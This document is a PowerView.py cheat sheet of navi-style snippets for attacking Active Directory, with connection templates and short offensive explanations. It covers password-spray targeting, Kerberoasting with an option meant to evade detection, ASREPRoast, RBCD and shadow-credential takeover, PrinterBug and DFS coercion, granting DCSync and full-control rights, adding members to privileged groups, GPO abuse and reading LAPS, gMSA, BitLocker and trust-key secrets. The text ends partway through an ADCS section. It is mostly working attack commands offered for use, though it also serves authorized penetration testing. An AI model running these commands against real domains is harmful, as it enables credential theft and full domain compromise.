# PowerView.py

<!-- cheat
export pvpy_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

var transport = printf 'ldap\tLDAP (default, 389)\nldaps\tLDAPS (636, TLS)\ngc\tGlobal Catalog (3268)\ngc-ldaps\tGlobal Catalog over TLS (3269)\nadws\tADWS (9389)\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ transport" --map "cut -f1"

if $transport == ldap
var transport_flag
fi

if $transport == ldaps
var transport_flag := --use-ldaps
fi

if $transport == gc
var transport_flag := --use-gc
fi

if $transport == gc-ldaps
var transport_flag := --use-gc-ldaps
fi

if $transport == adws
var transport_flag := --use-adws
fi

if $auth_method == hash
var auth_target := $domain/$user@$rhost_ip -H :$credential $transport_flag
fi

if $auth_method == password
var auth_target := $domain/$user:'$credential'@$rhost_ip $transport_flag
fi

if $auth_method == kerberos
var auth_target := $domain/$user@$rhost_ip -k $transport_flag
fi
-->

## Connect

### Open PowerView session

Execute open PowerView session with PowerView.py.

Drop into the interactive PowerView shell against the target DC. Every subcommand below assumes you are inside this prompt.

```sh title:"PowerView.py Execute Open PowerView Session"
powerview $auth_target
```
<!-- cheat
import domain_ip
import users
import passwords
import pvpy_auth
-->

## User Enumeration

### Safe spray candidates

Enumerate safe spray candidates with PowerView.py.

Returns users whose `badPwdCount` is zero - one spray attempt won't tip them toward lockout. Low-noise starting set.

```sh title:"PowerView.py Enumerate Safe Spray Candidates"
Get-DomainUser -Where 'badPwdCount contains 0'
```
<!-- cheat -->

### Kerberos encryption support

Enumerate kerberos encryption support with PowerView.py.

Lists every account with an SPN plus its supported encryption types. AES-capable accounts pair well with `-Opsec` Kerberoasting.

```sh title:"PowerView.py Enumerate Kerberos Encryption Support"
Get-DomainUser -SPN -Select samaccountname,msDS-SupportedEncryptionTypes
```
<!-- cheat -->

### Privileged users

Enumerate privileged users with PowerView.py.

Pulls accounts flagged `adminCount=1` - the historic marker for protected admin group members. Fast high-value target map.

```sh title:"PowerView.py Enumerate Privileged Users"
Get-DomainUser -AdminCount
```
<!-- cheat -->

### ASREPRoastable users

Crack ASREPRoastable users with PowerView.py.

Finds accounts with Kerberos pre-auth disabled. AS-REPs can be requested anonymously and cracked offline.

```sh title:"PowerView.py Crack ASREPRoastable Users"
Get-DomainUser -PreAuthNotRequired
```
<!-- cheat -->

### Unconstrained delegation users

Enumerate unconstrained delegation users with PowerView.py.

Lists users trusted for unconstrained delegation. Any TGT sent here is reusable - including DC machine TGTs after coercion.

```sh title:"PowerView.py Enumerate Unconstrained Delegation Users"
Get-DomainUser -Unconstrained
```
<!-- cheat -->

### Constrained delegation users

Enumerate constrained delegation users with PowerView.py.

Returns users with `TrustedToAuthForDelegation`. The principal can S4U2Proxy to its allowed SPNs as any user.

```sh title:"PowerView.py Enumerate Constrained Delegation Users"
Get-DomainUser -TrustedToAuth
```
<!-- cheat -->

### Locked out accounts

Enumerate locked out accounts with PowerView.py.

Surfaces currently-locked accounts. Skip these during sprays and flag if you spot a lockout sweep in progress.

```sh title:"PowerView.py Enumerate Locked Out Accounts"
Get-DomainUser -LockedOut
```
<!-- cheat -->

### Disabled accounts

Enumerate disabled accounts with PowerView.py.

Lists disabled users. Often hides stale SPNs, pre-auth-disabled relics, and forgotten service identities worth resurrecting.

```sh title:"PowerView.py Enumerate Disabled Accounts"
Get-DomainUser -Disabled
```
<!-- cheat -->

### Users with expired passwords

Dump users with expired passwords with PowerView.py.

Returns accounts whose password has expired - stale identities that may carry weak or known credentials.

```sh title:"PowerView.py Dump Users with Expired Passwords"
Get-DomainUser -PassExpired
```
<!-- cheat -->

### Users abused for RBCD

Read users abused for RBCD with PowerView.py.

Finds users set as principals in `msDS-AllowedToActOnBehalfOfOtherIdentity`. Reveals existing RBCD takeover paths.

```sh title:"PowerView.py Read Users Abused for RBCD"
Get-DomainUser -RBCD
```
<!-- cheat -->

### Users with shadow credentials

Dump users with shadow credentials with PowerView.py.

Lists users with `msDS-KeyCredentialLink` populated - usually evidence of a shadow-credentials primitive already in place.

```sh title:"PowerView.py Dump Users with Shadow Credentials"
Get-DomainUser -ShadowCred
```
<!-- cheat -->

### Users by department

Enumerate users by department with PowerView.py.

Search by `department` attribute. Pivot from org chart to specific business units.

```sh title:"PowerView.py Enumerate Users by Department"
Get-DomainUser -Department "$department"
```
<!-- cheat
var department --- --header "Department name (e.g. IT)"
-->

### Users by group membership

Enumerate users by group membership with PowerView.py.

Returns members of the named group. Quick way to enumerate any privileged or sensitive group.

```sh title:"PowerView.py Enumerate Users by Group Membership"
Get-DomainUser -MemberOf "$group"
```
<!-- cheat
var group --- --header "Group name (e.g. Domain Admins)"
-->

## Computer Enumeration

### LAPS-enabled computers

Read LAPS enabled computers with PowerView.py.

Lists computers with LAPS populated. If your principal can read `ms-Mcs-AdmPwd`, the local admin password comes back directly.

```sh title:"PowerView.py Read LAPS Enabled Computers"
Get-DomainComputer -LAPS
```
<!-- cheat -->

### Unconstrained delegation (non-DC)

Enumerate unconstrained delegation (non DC) with PowerView.py.

Finds unconstrained-delegation hosts excluding DCs. These can be coerced and used to capture TGTs from arbitrary principals.

```sh title:"PowerView.py Enumerate Unconstrained Delegation (non DC)"
Get-DomainComputer -Unconstrained -ExcludeDCs
```
<!-- cheat -->

### Domain printers

Enumerate domain printers with PowerView.py.

Lists computers registered as print servers - the classic PrinterBug coercion surface.

```sh title:"PowerView.py Enumerate Domain Printers"
Get-DomainComputer -Printers
```
<!-- cheat -->

### Obsolete operating systems

Enumerate obsolete operating systems with PowerView.py.

Returns hosts running unsupported Windows versions. Usually unpatched and easy pivots.

```sh title:"PowerView.py Enumerate Obsolete Operating Systems"
Get-DomainComputer -Obsolete
```
<!-- cheat -->

### Computers with resolved IPs

Enumerate computers with resolved IPs with PowerView.py.

Renders computer objects alongside resolved IPs in a table - quick target map straight out of DNS.

```sh title:"PowerView.py Enumerate Computers with Resolved IPs"
Get-DomainComputer -IncludeIP -Properties dnshostname -TableView
```
<!-- cheat -->

### Pre-Windows 2000 computers

Enumerate pre windows 2000 computers with PowerView.py.

Finds hosts flagged pre-Windows 2000 compatible. Often legacy/misconfigured and worth a closer look.

```sh title:"PowerView.py Enumerate Pre Windows 2000 Computers"
Get-DomainComputer -Pre2K
```
<!-- cheat -->

### BitLocker recovery keys

Enumerate BitLocker recovery keys with PowerView.py.

Lists computers with a BitLocker recovery key stored in AD. Readable keys unlock encrypted volumes.

```sh title:"PowerView.py Enumerate BitLocker Recovery Keys"
Get-DomainComputer -BitLocker
```
<!-- cheat -->

### Readable gMSA passwords

Read readable gMSA passwords with PowerView.py.

Returns computers whose gMSA password the current principal can read. Decoded directly to NT hash by PowerView.

```sh title:"PowerView.py Read Readable GMSA Passwords"
Get-DomainComputer -GMSAPassword
```
<!-- cheat -->

## Group & ACL Operations

### List group members

List group members with PowerView.py.

Enumerates members of a target group. Run against privileged groups to identify operators worth targeting.

```sh title:"PowerView.py List Group Members"
Get-DomainGroupMember -Identity "$group"
```
<!-- cheat
var group --- --header "Group name (e.g. Domain Admins)"
-->

### Groups a user belongs to

Run groups a user belongs to with PowerView.py.

Lists every group the user is a member of - effective access and inherited permissions in one view.

```sh title:"PowerView.py Run Groups a User Belongs to"
Get-DomainGroup -MemberIdentity $target_user
```
<!-- cheat
var target_user --- --header "User samAccountName"
-->

### ACLs for an object

Read ACLs for an object with PowerView.py.

Reads the DACL and resolves GUIDs to readable rights. The first step in finding misconfigured permissions.

```sh title:"PowerView.py Read ACLs for an Object"
Get-DomainObjectAcl -Identity "$identity" -ResolveGUIDs
```
<!-- cheat
var identity --- --header "Object identity (samAccountName, DN, SID)"
-->

### ACLs by SID

Run ACLs by SID with PowerView.py.

Filters ACEs to those granted to a specific SID. Answers "what can this principal do to that object?" in one shot.

```sh title:"PowerView.py Run ACLs by SID"
Get-DomainObjectAcl -Identity $identity -SecurityIdentifier $sid
```
<!-- cheat
var identity --- --header "Target object (e.g. DC01)"
var sid --- --header "SecurityIdentifier (S-1-5-21-...)"
-->

### Object owner

Write object owner with PowerView.py.

Returns the security-descriptor owner of an object. Owners hold implicit `WriteDacl`, so this often reveals control paths.

```sh title:"PowerView.py Write Object Owner"
Get-DomainObjectOwner -Identity "$identity"
```
<!-- cheat
var identity --- --header "Object identity"
-->

## DNS Operations

### List DNS zones

List DNS zones with PowerView.py.

Enumerates the AD-integrated DNS zones in the current domain. The starting point for DNS recon.

```sh title:"PowerView.py List DNS Zones"
Get-DomainDNSZone
```
<!-- cheat -->

### List forest DNS zones

List forest DNS zones with PowerView.py.

Lists DNS zones stored in the forest-wide partition. Often exposes zones invisible at the domain level.

```sh title:"PowerView.py List Forest DNS Zones"
Get-DomainDNSZone -Forest
```
<!-- cheat -->

### Records in a DNS zone

Dump records in a DNS zone with PowerView.py.

Dumps the records of a given DNS zone. Map hosts and services without sending any probes.

```sh title:"PowerView.py Dump Records in a DNS Zone"
Get-DomainDNSRecord -ZoneName $zone
```
<!-- cheat
var zone --- --header "DNS zone (e.g. domain.local)"
-->

### Add DNS record

Add DNS record with PowerView.py.

Creates a new A record in the configured zone. Stages WPAD, MITM, or coercion redirects.

```sh title:"PowerView.py Add DNS Record"
Add-DomainDNSRecord -RecordName $record -RecordAddress $lhost
```
<!-- cheat
import tun_ip
var record --- --header "Record name"
-->

### Disable DNS record

Disable DNS record with PowerView.py.

Soft-disables a DNS record by pointing it to an invalid address. Removes the entry without losing the object.

```sh title:"PowerView.py Disable DNS Record"
Disable-DomainDNSRecord -RecordName $record
```
<!-- cheat
var record --- --header "Record name to disable"
-->

## Kerberos Attacks

### Kerberoast all SPNs

Crack kerberoast all SPNs with PowerView.py.

Requests service tickets for every SPN-bearing account and returns crackable hashes. Standard offline attack on service accounts.

```sh title:"PowerView.py Crack Kerberoast All SPNs"
Invoke-Kerberoast
```
<!-- cheat -->

### Kerberoast (OPSEC AES)

Run kerberoast (OPSEC AES) with PowerView.py.

Requests AES-encrypted service tickets only - looks normal to detections tuned for RC4 roasting. Trades speed for stealth.

```sh title:"PowerView.py Run Kerberoast (OPSEC AES)"
Invoke-Kerberoast -Opsec
```
<!-- cheat -->

### ASREPRoast

Crack ASREPRoast with PowerView.py.

Requests AS-REPs for every pre-auth-disabled account. Works without valid credentials when fed a userlist.

```sh title:"PowerView.py Crack ASREPRoast"
Invoke-ASREPRoast
```
<!-- cheat -->

## Delegation

### Find RBCD configurations

Find RBCD configurations with PowerView.py.

Searches AD for accounts with `msDS-AllowedToActOnBehalfOfOtherIdentity` set. Reveals existing RBCD paths.

```sh title:"PowerView.py Find RBCD Configurations"
Get-DomainRBCD
```
<!-- cheat -->

### Set RBCD delegation

Set RBCD delegation with PowerView.py.

Writes an RBCD entry so the attacker-controlled computer can S4U2Proxy to the target as any user. Classic RBCD takeover.

```sh title:"PowerView.py Set RBCD Delegation"
Set-DomainRBCD -Identity $target -DelegateFrom $attacker
```
<!-- cheat
var target --- --header "Target computer (e.g. targetcomputer$)"
var attacker --- --header "Attacker computer (e.g. attackercomputer$)"
-->

## Certificate Services

### Vulnerable certificate templates

Read vulnerable certificate templates with PowerView.py.

Lists ADCS templates with known-bad configurations and resolves their ACL SIDs. Targets for ESC1/2/3/etc.

```sh title:"PowerView.py Read Vulnerable Certificate Templates"
Get-DomainCATemplate -Vulnerable -ResolveSIDs
```
<!-- cheat -->

### List CAs with checks

List CAs with checks with PowerView.py.

Enumerates CAs in the forest and runs web-enrollment / config checks. Quick ADCS surface health check.

```sh title:"PowerView.py List CAs with Checks"
Get-DomainCA -CheckAll
```
<!-- cheat -->

## Shadow Credentials

### Add shadow credential

Add shadow credential with PowerView.py.

Adds a key credential to `msDS-KeyCredentialLink`. The attacker can then PKINIT as the target.

```sh title:"PowerView.py Add Shadow Credential"
Set-ShadowCredential -Identity $target -Add
```
<!-- cheat
var target --- --header "Target identity"
-->

### List shadow credentials

List shadow credentials with PowerView.py.

Reads the key credentials currently set on a target. Audit or cleanup primitive.

```sh title:"PowerView.py List Shadow Credentials"
Get-ShadowCredential -Identity $target
```
<!-- cheat
var target --- --header "Target identity (e.g. DC01$)"
-->

## Service Accounts

### List gMSA accounts

List gMSA accounts with PowerView.py.

Enumerates group-managed service accounts. If the current principal can read the managed password, it comes back here.

```sh title:"PowerView.py List GMSA Accounts"
Get-DomainGMSA
```
<!-- cheat -->

### List dMSA accounts

List dMSA accounts with PowerView.py.

Lists delegated managed service accounts - the newer cousin of gMSA, worth checking on modern domains.

```sh title:"PowerView.py List DMSA Accounts"
Get-DomainDMSA
```
<!-- cheat -->

## Remote Computer Operations

### Remote sessions

Enumerate remote sessions with PowerView.py.

Queries logon sessions over SMB. Reveals who is currently signed in for session hunting.

```sh title:"PowerView.py Enumerate Remote Sessions"
Get-NetSession -Computer $computer
```
<!-- cheat
var computer --- --header "Remote computer (e.g. DC01)"
-->

### List remote shares

List remote shares with PowerView.py.

Enumerates SMB shares exposed by a remote host. Step zero before file hunting.

```sh title:"PowerView.py List Remote Shares"
Get-NetShare -Computer $computer
```
<!-- cheat
var computer --- --header "Remote computer"
-->

### List running services

List running services with PowerView.py.

Lists services currently running on a remote host. Spot EDR, agents, and service-account abuse openings.

```sh title:"PowerView.py List Running Services"
Get-NetService -Computer $computer -IsRunning
```
<!-- cheat
var computer --- --header "Remote computer"
-->

### Login events from remote host

Run login events from remote host with PowerView.py.

Pulls recent successful-logon events from a remote security log. Maps who has been touching the host.

```sh title:"PowerView.py Run Login Events from Remote Host"
Get-EventLog -Computer $computer -EventId $eventid -MaxEvents $max
```
<!-- cheat
var computer --- --header "Remote computer"
var eventid := 4624
var max := 50
-->

### List remote processes

List remote processes with PowerView.py.

Enumerates running processes on a remote host. Finds interactive users and EDR agents.

```sh title:"PowerView.py List Remote Processes"
Get-NetProcess -Computer $computer
```
<!-- cheat
var computer --- --header "Remote computer"
-->

### Find local admin access

Find local admin access with PowerView.py.

Sweeps the domain for machines where the current principal is local admin. Lateral-movement target list in one call.

```sh title:"PowerView.py Find Local Admin Access"
Find-LocalAdminAccess
```
<!-- cheat -->

## Coercion Attacks

### PrinterBug coercion

Trigger PrinterBug coercion with PowerView.py.

Triggers the Print Spooler RPC bug to force the target into authenticating to your listener. Classic machine-account capture primitive.

```sh title:"PowerView.py Trigger PrinterBug Coercion"
Invoke-PrinterBug -Target $target -Listener $lhost
```
<!-- cheat
import tun_ip
var target --- --header "Coercion target (e.g. DC01)"
-->

### DFS coercion

Trigger DFS coercion with PowerView.py.

Forces the target to authenticate via the DFS-NS RPC interface. Works when PrinterBug and PetitPotam are patched.

```sh title:"PowerView.py Trigger DFS Coercion"
Invoke-DFSCoerce -Target $target -Listener $lhost
```
<!-- cheat
import tun_ip
var target --- --header "Coercion target"
-->

## Object Modification

### Set object attribute

Set object attribute with PowerView.py.

Overwrites a single attribute on a domain object. Building block for many AD abuses (SPN write, description tampering, etc.).

```sh title:"PowerView.py Set Object Attribute"
Set-DomainObject -Identity $identity -Set '$attribute=$value'
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name (e.g. description)"
var value --- --header "Attribute value"
-->

### Append attribute value

Read append attribute value with PowerView.py.

Appends to a multi-valued attribute instead of overwriting. Add a new SPN without nuking existing ones.

```sh title:"PowerView.py Read Append Attribute Value"
Set-DomainObject -Identity $identity -Append '$attribute=$value'
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name (e.g. servicePrincipalname)"
var value --- --header "Value to append"
-->

### Clear attribute

Read clear attribute with PowerView.py.

Clears an attribute on a domain object. Cleanup primitive or SPN reset.

```sh title:"PowerView.py Read Clear Attribute"
Set-DomainObject -Identity $identity -Clear $attribute
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name to clear"
-->

### Set attribute from file

Set attribute from file with PowerView.py.

Sets an attribute's value from a local file. Useful for stuffing binary blobs like `msDS-KeyCredentialLink` payloads.

```sh title:"PowerView.py Set Attribute from File"
Set-DomainObject -Identity $identity -Set '$attribute=@$filepath'
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name"
var filepath --- --header "Path to file (e.g. /path/to/file)"
-->

### Change user password

Read change user password with PowerView.py.

Resets a user's password to a new value. Requires `User-Force-Change-Password` or equivalent ACL on the target.

```sh title:"PowerView.py Read Change User Password"
Set-DomainUserPassword -Identity $target_user -AccountPassword '$new_password'
```
<!-- cheat
import passwords
var target_user --- --header "Target user"
-->

### Move object to OU

Read move object to OU with PowerView.py.

Moves a domain object to a different OU by rewriting its DN. Stages OU-linked GPO attacks.

```sh title:"PowerView.py Read Move Object to OU"
Set-DomainObjectDN -Identity $identity -DestinationDN "$dn"
```
<!-- cheat
var identity --- --header "Target object"
var dn --- --header "Destination DN (e.g. OU=IT,DC=domain,DC=local)"
-->

## Output Formatting

### Table view

Run table view with PowerView.py.

Renders query results as a console table for the chosen properties. The most readable default for ad-hoc exploration.

```sh title:"PowerView.py Run Table View"
Get-DomainUser -Properties $properties -TableView
```
<!-- cheat
var properties := samaccountname,description
-->

### Markdown table output

Run markdown table output with PowerView.py.

Renders results as a Markdown table - ready to paste into notes or reports.

```sh title:"PowerView.py Run Markdown Table Output"
Get-DomainUser -Properties $properties -TableView md
```
<!-- cheat
var properties := samaccountname,description
-->

### CSV output

Read CSV output with PowerView.py.

Emits results as CSV. Pipe into scripts or spreadsheets for bulk wrangling.

```sh title:"PowerView.py Read CSV Output"
Get-DomainUser -Properties $properties -TableView csv
```
<!-- cheat
var properties := samaccountname,description
-->

### Filter: contains

Run filter: contains with PowerView.py.

Filters where the named attribute contains the given substring. Loose match for free-form fields.

```sh title:"PowerView.py Run Filter: Contains"
Get-DomainUser -Where 'samaccountname contains $value'
```
<!-- cheat
var value --- --header "Substring to match (e.g. admin)"
-->

### Filter: equals

Run filter: equals with PowerView.py.

Filters to exact, case-insensitive matches on the attribute.

```sh title:"PowerView.py Run Filter: Equals"
Get-DomainUser -Where 'samaccountname eq $value'
```
<!-- cheat
var value --- --header "Exact value (e.g. Administrator)"
-->

### Filter: in

Start filter: in with PowerView.py.

Filters where the value appears within the attribute - effectively a reverse-`contains` for token lookups.

```sh title:"PowerView.py Start Filter: in"
Get-DomainUser -Where 'description in $value'
```
<!-- cheat
var value --- --header "Token to look for (e.g. password)"
-->

### Sort results

Run sort results with PowerView.py.

Sorts the result set by the chosen attribute. Pairs with table or CSV output for tidy reports.

```sh title:"PowerView.py Run Sort Results"
Get-DomainUser -Properties $properties -SortBy $sortby
```
<!-- cheat
var properties := samaccountname,lastLogon
var sortby := lastLogon
-->

### Count enabled users

Check count enabled users with PowerView.py.

Returns the count of enabled accounts rather than the rows. Quick sanity check on domain size.

```sh title:"PowerView.py Check Count Enabled Users"
Get-DomainUser -Enabled -Count
```
<!-- cheat -->

## Domain & Forest Info

### Domain info

Show domain info with PowerView.py.

Reads the domain object including useful policy properties - check `ms-DS-MachineAccountQuota` before adding machine accounts.

```sh title:"PowerView.py Show Domain Info"
Get-Domain -Properties $properties
```
<!-- cheat
var properties := ms-DS-MachineAccountQuota
-->

### List domain controllers

List domain controllers with PowerView.py.

Lists the DCs visible from this principal. Pick a DC before further operations.

```sh title:"PowerView.py List Domain Controllers"
Get-DomainController -Properties dnshostname,operatingsystem
```
<!-- cheat -->

### List OUs

List OUs with PowerView.py.

Enumerates organisational units in the domain. Pair with `-Writable` to find OUs you can manipulate.

```sh title:"PowerView.py List OUs"
Get-DomainOU -ResolveGPLink
```
<!-- cheat -->

### Writable OUs

Show writable OUs with PowerView.py.

Returns OUs the current principal can write to - building block for GPO link abuse.

```sh title:"PowerView.py Show Writable OUs"
Get-DomainOU -Writable
```
<!-- cheat -->

### Raw object lookup

Show raw object lookup with PowerView.py.

Fetches any domain object by identity or LDAP filter. The escape hatch when no dedicated `Get-*` fits.

```sh title:"PowerView.py Show Raw Object Lookup"
Get-DomainObject -Identity "$identity"
```
<!-- cheat
var identity --- --header "Object identity (e.g. DC01$)"
-->

### Tombstoned objects

Show tombstoned objects with PowerView.py.

Lists objects in the Deleted Objects container. Step zero before restoring a removed object.

```sh title:"PowerView.py Show Tombstoned Objects"
Get-DomainObject -Deleted
```
<!-- cheat -->

### Restore deleted object

Show restore deleted object with PowerView.py.

Restores a tombstoned object back into the directory, optionally into a chosen target OU.

```sh title:"PowerView.py Show Restore Deleted Object"
Restore-DomainObject -Identity $identity -TargetPath "$dn"
```
<!-- cheat
var identity --- --header "Deleted object (e.g. deleteduser)"
var dn --- --header "Target DN (e.g. OU=Users,DC=domain,DC=local)"
-->

### Set object owner

Set object owner with PowerView.py.

Rewrites the security-descriptor owner of a target object. Owners hold implicit `WriteDacl` - classic ACL takeover step.

```sh title:"PowerView.py Set Object Owner"
Set-DomainObjectOwner -TargetIdentity "$target" -PrincipalIdentity $principal
```
<!-- cheat
var target --- --header "Target object DN/identity"
var principal --- --header "New owner principal (e.g. lowpriv)"
-->

### Clear LDAP cache

Show clear LDAP cache with PowerView.py.

Drops PowerView's in-memory LDAP query cache so the next query hits the wire. Chases fresh changes.

```sh title:"PowerView.py Show Clear LDAP Cache"
Clear-Cache
```
<!-- cheat -->

## Account State

### Disable account

Disable account with PowerView.py.

Disables a domain account. Freeze a target during an op or clean up a rogue identity.

```sh title:"PowerView.py Disable Account"
Disable-ADAccount -Identity $target_user
```
<!-- cheat
var target_user --- --header "Target account"
-->

### Enable account

Enable account with PowerView.py.

Clears `ACCOUNTDISABLE` on a disabled account. Wakes a stale identity for an attack chain.

```sh title:"PowerView.py Enable Account"
Enable-ADAccount -Identity $target_user
```
<!-- cheat
var target_user --- --header "Target account"
-->

### Unlock account

Run unlock account with PowerView.py.

Clears the lockout flag on an account. Use after over-spraying a real user.

```sh title:"PowerView.py Run Unlock Account"
Unlock-ADAccount -Identity $target_user
```
<!-- cheat
var target_user --- --header "Locked account (e.g. lockeduser)"
-->

### Switch session credentials

Dump switch session credentials with PowerView.py.

Re-authenticates the current PowerView session as a different user without exiting. Pivot between captured creds in-place.

```sh title:"PowerView.py Dump Switch Session Credentials"
Login-As -Username $target_user -Domain $domain -Password '$new_password'
```
<!-- cheat
import domain_ip
import passwords
var target_user --- --header "Username"
-->

## Object Lifecycle

### Add domain user

Add domain user with PowerView.py.

Creates a new domain user. Requires sufficient ACL rights on the target container.

```sh title:"PowerView.py Add Domain User"
Add-DomainUser -UserName $target_user -Password '$new_password'
```
<!-- cheat
import passwords
var target_user --- --header "New username"
-->

### Remove domain user

Remove domain user with PowerView.py.

Deletes a domain user. Watch out for tombstone behaviour and dependencies.

```sh title:"PowerView.py Remove Domain User"
Remove-DomainUser -Identity $target_user
```
<!-- cheat
var target_user --- --header "User to delete"
-->

### Add domain computer

Add domain computer with PowerView.py.

Adds a machine account to the domain - bounded by `ms-DS-MachineAccountQuota`. Building block for RBCD and shadow creds.

```sh title:"PowerView.py Add Domain Computer"
Add-DomainComputer -ComputerName $rhost_name -ComputerPass $new_password
```
<!-- cheat
import passwords
var rhost_name --- --header "Computer name (no trailing $)"
-->

### Remove domain computer

Remove domain computer with PowerView.py.

Deletes a machine account. Cleanup after RBCD or shadow-creds chains.

```sh title:"PowerView.py Remove Domain Computer"
Remove-DomainComputer -ComputerName $rhost_name
```
<!-- cheat
var rhost_name --- --header "Computer name"
-->

### Reset computer password

Dump reset computer password with PowerView.py.

Forces a new password onto a computer account. Reset machine creds you control or recover an owned host.

```sh title:"PowerView.py Dump Reset Computer Password"
Set-DomainComputerPassword -Identity '$rhost_name' -AccountPassword '$new_password'
```
<!-- cheat
import passwords
var rhost_name --- --header "Computer (e.g. COMPUTER01$)"
-->

### Add domain group

Add domain group with PowerView.py.

Creates a new security group. Stage a group for GPO or ACL abuse.

```sh title:"PowerView.py Add Domain Group"
Add-DomainGroup -Identity "$group"
```
<!-- cheat
var group --- --header "New group name"
-->

### Add user to group

Add user to group with PowerView.py.

Adds a principal to a target group. Classic privesc primitive once you can write to the group.

```sh title:"PowerView.py Add User to Group"
Add-DomainGroupMember -Identity "$group" -Members $target_user
```
<!-- cheat
var group --- --header "Target group (e.g. Domain Admins)"
var target_user --- --header "Member to add"
-->

### Remove user from group

Remove user from group with PowerView.py.

Removes a principal from a group. Cleanup or competitor kick.

```sh title:"PowerView.py Remove User from Group"
Remove-DomainGroupMember -Identity "$group" -Members $target_user
```
<!-- cheat
var group --- --header "Target group"
var target_user --- --header "Member to remove"
-->

### Add OU

Add OU with PowerView.py.

Creates a new organisational unit. Pair with GPO link primitives to attack accounts moved into it.

```sh title:"PowerView.py Add OU"
Add-DomainOU -Identity "$ou"
```
<!-- cheat
var ou --- --header "New OU name"
-->

### Remove OU

Remove OU with PowerView.py.

Deletes an OU. Be careful - child objects move or vanish depending on flags.

```sh title:"PowerView.py Remove OU"
Remove-DomainOU -Identity "$ou"
```
<!-- cheat
var ou --- --header "OU to delete"
-->

### Generic object remove

Remove generic object remove with PowerView.py.

Deletes any domain object by identity. Catch-all for unusual classes.

```sh title:"PowerView.py Remove Generic Object Remove"
Remove-DomainObject -Identity $identity
```
<!-- cheat
var identity --- --header "Object to delete"
-->

## ACL Editing

### Grant DCSync rights

Set grant DCSync rights with PowerView.py.

Grants `DS-Replication-Get-Changes` + `-All` on the domain to a principal. Sets up the classic DCSync primitive.

```sh title:"PowerView.py Set Grant DCSync Rights"
Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights dcsync
```
<!-- cheat
var target --- --header "Target object (usually domain root or DC)"
var principal --- --header "Principal to grant rights to"
-->

### Grant full control ACL

Run grant full control ACL with PowerView.py.

Grants `GenericAll` over a target object. Sweeping primitive used in many ACL takeover chains.

```sh title:"PowerView.py Run Grant Full Control ACL"
Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights fullcontrol
```
<!-- cheat
var target --- --header "Target object"
var principal --- --header "Principal to grant rights to"
-->

### Grant RBCD ACL

Run grant RBCD ACL with PowerView.py.

Writes the RBCD descriptor on the target so the principal can S4U2Proxy as anyone. ACL-based RBCD staging.

```sh title:"PowerView.py Run Grant RBCD ACL"
Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights RBCD
```
<!-- cheat
var target --- --header "Target computer (e.g. SQL03)"
var principal --- --header "Attacker-controlled computer (e.g. POC113)"
-->

### Remove ACL entry

Remove ACL entry with PowerView.py.

Removes a previously granted right from the target's DACL. Cleanup primitive for ACL chains.

```sh title:"PowerView.py Remove ACL Entry"
Remove-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights $rights
```
<!-- cheat
var target --- --header "Target object"
var principal --- --header "Principal to remove"
var rights --- --header "Rights to remove (e.g. dcsync)"
-->

## GPO

### List GPOs

List GPOs with PowerView.py.

Enumerates Group Policy Objects in the domain. Inspect `gpcfilesyspath` to find writable policies.

```sh title:"PowerView.py List GPOs"
Get-DomainGPO -Properties displayname,gpcfilesyspath
```
<!-- cheat -->

### GPO local group settings

Set GPO local group settings with PowerView.py.

Reads Restricted Groups / GPP entries that assign local group membership via GPO. Excellent source of lateral movement clues.

```sh title:"PowerView.py Set GPO Local Group Settings"
Get-DomainGPOLocalGroup -Identity "$gpo"
```
<!-- cheat
var gpo --- --header "GPO display name (e.g. Default Domain Policy)"
-->

### Dump GPO settings

Dump GPO settings with PowerView.py.

Parses and dumps the settings of a GPO. Understand what a policy actually does before tampering.

```sh title:"PowerView.py Dump GPO Settings"
Get-DomainGPOSettings -Identity "$gpo"
```
<!-- cheat
var gpo --- --header "GPO display name"
-->

### Link GPO to OU

Run link GPO to OU with PowerView.py.

Links an existing GPO to an OU or container. Follow-up after staging or hijacking a malicious GPO.

```sh title:"PowerView.py Run Link GPO to OU"
Add-GPLink -GUID "$guid" -TargetIdentity "$target"
```
<!-- cheat
var guid --- --header "GPO GUID (e.g. {31B2F340-016D-11D2-945F-00C04FB984F9})"
var target --- --header "Target OU/container DN"
-->

### Unlink GPO

Run unlink GPO with PowerView.py.

Removes a GPO link from a target OU/container. Cleanup primitive after GPO abuse.

```sh title:"PowerView.py Run Unlink GPO"
Remove-GPLink -GUID "$guid" -TargetIdentity "$target"
```
<!-- cheat
var guid --- --header "GPO GUID"
var target --- --header "Target OU/container DN"
-->

### Create new GPO

Create new GPO with PowerView.py.

Creates a brand new GPO and optionally links it. Stage your own policy when you can't modify an existing one.

```sh title:"PowerView.py Create New GPO"
Add-DomainGPO -Identity "$name" -LinkTo "$target"
```
<!-- cheat
var name --- --header "New GPO name"
var target --- --header "OU/container DN to link to"
-->

## Domain Trusts & Forest

### List domain trusts

List domain trusts with PowerView.py.

Lists trust relationships of the current domain. Foundation for cross-domain enumeration.

```sh title:"PowerView.py List Domain Trusts"
Get-DomainTrust -Properties trustDirection,trustPartner
```
<!-- cheat -->

### Domain trust keys

Run domain trust keys with PowerView.py.

Reads the trust account keys stored in AD. Sensitive material - enables inter-realm forgeries when accessible.

```sh title:"PowerView.py Run Domain Trust Keys"
Get-DomainTrustKey
```
<!-- cheat -->

### Foreign users

Run foreign users with PowerView.py.

Lists users from other domains added inside this one. Reveals cross-domain paths via foreign security principals.

```sh title:"PowerView.py Run Foreign Users"
Get-DomainForeignUser
```
<!-- cheat -->

### Foreign group members

Run foreign group members with PowerView.py.

Lists groups in this domain that contain members from another. Maps inbound cross-trust access.

```sh title:"PowerView.py Run Foreign Group Members"
Get-DomainForeignGroupMember
```
<!-- cheat -->

## ADCS Additions

### Modify CA template

Create modify CA template with PowerView.py.

